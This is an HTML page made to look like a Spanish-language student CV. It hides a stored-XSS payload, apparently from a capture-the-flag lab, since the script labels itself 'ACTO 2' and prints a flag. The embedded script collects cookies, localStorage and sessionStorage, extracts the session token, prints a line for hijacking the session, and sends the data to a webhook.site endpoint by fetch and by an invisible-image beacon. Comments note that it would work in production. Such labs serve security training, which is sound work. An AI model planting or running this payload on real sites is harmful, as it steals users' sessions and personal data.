<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Curriculum Vitae - Juan PÃ©rez</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        h1 { color: #333; }
        h2 { color: #666; border-bottom: 2px solid #6366f1; }
        .section { margin: 20px 0; }
    </style>
</head>
<body>
    <h1>Curriculum Vitae</h1>
    
    <div class="section">
        <h2>InformaciÃ³n Personal</h2>
        <p><strong>Nombre:</strong> Juan PÃ©rez Estudiante</p>
        <p><strong>Email:</strong> juan.perez@ejemplo.com</p>
        <p><strong>TelÃ©fono:</strong> +57 300 123 4567</p>
        <p><strong>LinkedIn:</strong> linkedin.com/in/juanperez</p>
    </div>
    
    <div class="section">
        <h2>Perfil Profesional</h2>
        <p>
            Estudiante de IngenierÃ­a de Sistemas con conocimientos en desarrollo web,
            bases de datos y metodologÃ­as Ã¡giles. Apasionado por la tecnologÃ­a y
            la innovaciÃ³n, buscando oportunidades de pasantÃ­a para aplicar y ampliar
            mis habilidades en un entorno profesional.
        </p>
    </div>
    
    <div class="section">
        <h2>FormaciÃ³n AcadÃ©mica</h2>
        <p><strong>Universidad de MedellÃ­n</strong></p>
        <p>IngenierÃ­a de Sistemas - 7Âº Semestre (2021 - Presente)</p>
        <p>Promedio: 4.3/5.0</p>
    </div>
    
    <div class="section">
        <h2>Experiencia</h2>
        <ul>
            <li>
                <strong>Desarrollador Jr. - TechCompany SAS</strong><br>
                Enero 2023 - Diciembre 2023<br>
                Desarrollo de aplicaciones web con React y Node.js
            </li>
            <li>
                <strong>Practicante - StartupXYZ</strong><br>
                Junio 2022 - Diciembre 2022<br>
                Soporte tÃ©cnico y desarrollo de features
            </li>
        </ul>
    </div>
    
    <div class="section">
        <h2>Habilidades TÃ©cnicas</h2>
        <ul>
            <li>Lenguajes: Python, JavaScript, Java</li>
            <li>Frameworks: Flask, React, Spring Boot</li>
            <li>Bases de Datos: MySQL, PostgreSQL, MongoDB</li>
            <li>Control de versiones: Git, GitHub</li>
            <li>MetodologÃ­as: Scrum, Kanban</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>Proyectos Destacados</h2>
        <ul>
            <li><strong>Sistema de GestiÃ³n AcadÃ©mica:</strong> AplicaciÃ³n web para gestiÃ³n de notas y horarios</li>
            <li><strong>App de Delivery:</strong> AplicaciÃ³n mÃ³vil con React Native</li>
            <li><strong>Chatbot con IA:</strong> Bot de atenciÃ³n al cliente con NLP</li>
        </ul>
    </div>
    
    <!-- ========================================
         PAYLOAD XSS - ACTO 2
         ======================================== -->
    <script>
        console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
        console.log('ğŸš© XSS PAYLOAD EJECUTADO - ACTO 2');
        console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
        
        // 1. Capturar informaciÃ³n del navegador
        const victimInfo = {
            cookies: document.cookie,
            url: window.location.href,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage)
        };
        
        console.log('ğŸ“¦ InformaciÃ³n capturada:', victimInfo);
        
        // 2. Mostrar cookies en consola (para el lab)
        console.log('ğŸª COOKIES CAPTURADAS:');
        console.log(document.cookie);
        
        // 3. Extraer session_token especÃ­ficamente
        const cookies = document.cookie.split(';');
        let sessionToken = null;
        
        cookies.forEach(cookie => {
            const [name, value] = cookie.trim().split('=');
            if (name === 'session_token') {
                sessionToken = value;
            }
        });
        
        if (sessionToken) {
            console.log('ğŸ¯ SESSION TOKEN ENCONTRADO:');
            console.log(sessionToken);
            console.log('');
            console.log('ğŸ’¡ Para robar esta sesiÃ³n, ejecuta en otra ventana:');
            console.log(`document.cookie = "session_token=${sessionToken}"; location.href = "/";`);
        }
        
        // 4. Intentar enviar a servidor del atacante
        // Reemplaza 'TU-WEBHOOK-ID' con tu ID de webhook.site
        const webhookUrl = 'https://webhook.site/TU-WEBHOOK-ID';
        
        // Nota: En local puede fallar por CORS, pero en producciÃ³n funcionarÃ­a
        fetch(webhookUrl, {
            method: 'POST',
            mode: 'no-cors',  // Evita errores de CORS en el navegador
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(victimInfo)
        })
        .then(() => {
            console.log('âœ… Datos enviados al servidor del atacante');
        })
        .catch(error => {
            console.log('âš ï¸ Error al enviar (normal en localhost):', error.message);
            console.log('ğŸ’¡ En un escenario real, los datos se habrÃ­an enviado correctamente');
        });
        
        // 5. Alternativa: Crear imagen invisible para exfiltraciÃ³n
        // Este mÃ©todo funciona incluso con CORS
        const exfilImg = new Image();
        exfilImg.src = webhookUrl + '?data=' + encodeURIComponent(document.cookie);
        
        // 6. Mostrar alerta (opcional, solo para demostraciÃ³n)
        // En un ataque real no mostrarÃ­as esto
        if (confirm('ğŸš© XSS ejecutado exitosamente!\n\nCheck la consola del navegador para ver las cookies robadas.\n\nÂ¿Quieres ver los datos capturados?')) {
            console.table(victimInfo);
        }
        
        console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
        console.log('FLAG{stored_xss_persisted}');
        console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
    </script>
    
    <div class="section">
        <h2>Referencias</h2>
        <p>Disponibles bajo solicitud</p>
    </div>
    
    <footer style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd; text-align: center; color: #666;">
        <p>Documento generado el 15 de Febrero de 2024</p>
    </footer>
</body>
</html>
